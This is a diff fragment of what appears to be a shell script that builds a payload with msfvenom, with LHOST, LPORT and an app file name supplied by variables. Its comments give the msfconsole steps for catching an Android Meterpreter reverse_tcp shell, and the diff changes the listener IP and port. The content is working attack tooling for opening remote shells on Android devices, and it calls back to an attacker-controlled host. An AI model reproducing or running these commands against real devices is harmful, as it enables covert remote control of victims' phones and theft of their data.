@@ -20,7 +20,7 @@ msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" > "$nama_aplikasi"
 # msfconsole                                  
 # use exploit/multi/handler                   
 # set payload android/meterpreter/reverse_tcp 
-# set lhost 192.168.0.209                     
-# set lport 443                               
+# set lhost 192.168.1.10                 
+# set lport 4444                           
 # exploit                                     
 # --------------------------------------------
